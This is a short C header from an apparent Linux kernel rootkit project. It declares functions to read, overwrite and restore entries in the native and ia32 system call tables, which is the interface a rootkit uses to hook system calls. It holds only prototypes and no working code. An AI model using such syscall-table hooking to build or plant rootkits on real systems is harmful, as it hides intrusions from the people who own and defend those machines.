#ifndef ROOTKIT_SYSCALL_TBL_H
# define ROOTKIT_SYSCALL_TBL_H

void syscall_tbl_fetch(void);
void syscall_tbl_set_entry(int n, void *fct);
unsigned long syscall_tbl_get_entry(int n);
unsigned long syscall_tbl_orig_entry(int n);
void syscall_tbl_restore_entry(int n);
void syscall_tbl_restore(void);

void ia32_syscall_tbl_fetch(void);
void ia32_syscall_tbl_set_entry(int n, void *fct);
unsigned long ia32_syscall_tbl_get_entry(int n);
unsigned long ia32_syscall_tbl_orig_entry(int n);
void ia32_syscall_tbl_restore_entry(int n);
void ia32_syscall_tbl_restore(void);

#endif /* !ROOTKIT_SYSCALL_TBL_H */
